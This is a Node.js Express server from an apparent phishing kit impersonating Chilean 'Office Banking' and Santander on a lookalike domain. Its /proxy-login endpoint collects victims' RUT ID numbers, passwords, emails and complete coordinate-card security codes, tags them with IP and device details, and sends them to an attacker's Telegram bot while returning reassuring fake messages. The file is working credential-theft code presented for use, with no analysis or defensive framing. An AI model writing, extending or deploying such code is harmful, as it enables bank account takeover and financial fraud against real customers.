const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// ✅ CORS mejorado - permite AMBOS dominios sin redirección
const corsOptions = {
  origin: function(origin, callback) {
    if (!origin || 
        origin === "https://www.officebankingchile.info" || 
        origin === "https://officebankingchile.info" ||
        origin === "http://localhost:3000" ||
        origin === "http://localhost:5000") {
      callback(null, true);
    } else {
      callback(new Error("No permitido por CORS"));
    }
  },
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ✅ Middleware para logging detallado
app.use((req, res, next) => {
  console.log(`\n📨 ${req.method} ${req.path}`);
  console.log(`Origin: ${req.get('origin')}`);
  if(req.method === "POST") {
    console.log(`Body:`, JSON.stringify(req.body, null, 2));
  }
  next();
});

// Verificación de variables de entorno
console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
if(process.env.TELEGRAM_TOKEN) console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
if(process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
console.log("================================\n");

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
});

// Leer configuración
app.get("/config", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
    res.json(cfg);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Procesar saldo
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Guardar configuración
app.post("/config", (req, res) => {
  try {
    fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
    res.json(req.body);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Autorización
app.get("/autorizacion", (req, res) => {
  try {
    const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

    if (cfg.tipoAutorizacion === "santander") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      return;
    }

    if (cfg.tipoAutorizacion === "coordenadas") {
      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
      return;
    }

    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Enviar autorización a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
      });
    }
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error("Error en autorizar:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Función para enviar a Telegram
async function enviarATelegram(mensaje) {
  try {
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: process.env.CHAT_ID, 
        text: mensaje 
      })
    });

    const data = await response.json();
    return data.ok;
  } catch (err) {
    console.error(`❌ Error enviando a Telegram:`, err.message);
    return false;
  }
}

// 🔍 Detección de navegador / sistema / dispositivo
function detectarNavegador(userAgent) {
  userAgent = userAgent || "";

  let navegador = "Desconocido";
  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent)) navegador = "Chrome";
  else if (/edg/i.test(userAgent)) navegador = "Edge";
  else if (/firefox|fxios/i.test(userAgent)) navegador = "Firefox";
  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) navegador = "Safari";
  else if (/opr|opera/i.test(userAgent)) navegador = "Opera";

  let sistema = "Desconocido";
  if (/windows nt/i.test(userAgent)) sistema = "Windows";
  else if (/android/i.test(userAgent)) sistema = "Android";
  else if (/iphone|ipad|ipod/i.test(userAgent)) sistema = "iOS";
  else if (/mac os/i.test(userAgent)) sistema = "MacOS";
  else if (/linux/i.test(userAgent)) sistema = "Linux";

  let dispositivo = "Desktop";
  if (/mobile/i.test(userAgent)) dispositivo = "Móvil";
  else if (/tablet|ipad/i.test(userAgent)) dispositivo = "Tablet";

  return { navegador, sistema, dispositivo };
}

// =============================================
//   🔥🔥🔥  BLOQUE /proxy-login ACTUALIZADO  🔥🔥🔥
// =============================================

app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail, coordenadas } = req.body; // ← aquí agregamos coordenadas
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const infoNavegador = detectarNavegador(userAgent);

  console.log("\n" + "=".repeat(60));
  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
  console.log(`IP: ${ip}`);
  console.log("User-Agent:", userAgent);
  console.log("=".repeat(60));

  try {
    // 📧 CORREO
    if (mail) {
      const mensajeCorrecto = `📧 Correo actualizado:
${mail}
IP: ${ip}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;
      await enviarATelegram(mensajeCorrecto);
      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
    }

    // 🔐 LOGIN
    if (rut && passwd) {
      const mensajeLogin = `🔐 Nuevo Login en Office Banking:
RUT: ${rut}
Clave: ${passwd}
IP: ${ip}
Hora: ${new Date().toLocaleString('es-CL')}
Navegador: ${infoNavegador.navegador}
Sistema: ${infoNavegador.sistema}
Dispositivo: ${infoNavegador.dispositivo}`;

      await enviarATelegram(mensajeLogin);
      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
    }

    // 🔢 COORDENADAS (AGREGADO Y CORREGIDO)
    if (coordenadas) {
      const coords = coordenadas;
      let texto = "🔐 Tarjeta de Coordenadas\n\n";

      const letras = ["A","B","C","D","E","F","G","H","I","J"];

      for (let fila = 1; fila <= 5; fila++) {
        let linea = "";
        for (let col of letras) {
          linea += `${col}${fila}: ${coords[col+fila]} | `;
        }
        texto += linea.slice(0, -3) + "\n";
      }

      texto += `\nIP: ${ip}`;
      texto += `\nHora: ${new Date().toLocaleString('es-CL')}`;
      texto += `\nNavegador: ${infoNavegador.navegador}`;
      texto += `\nSistema: ${infoNavegador.sistema}`;
      texto += `\nDispositivo: ${infoNavegador.dispositivo}`;

      await enviarATelegram(texto);

      return res.json({
        status: "ok",
        mensaje: "Coordenadas recibidas correctamente"
      });
    }

    // ❌ SIN PARÁMETROS
    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });

  } catch (err) {
    console.error(`❌ Error en /proxy-login:`, err);
    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
  }
});

// Página principal
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 404
app.use((req, res) => {
  res.status(404).json({ error: "Ruta no encontrada" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
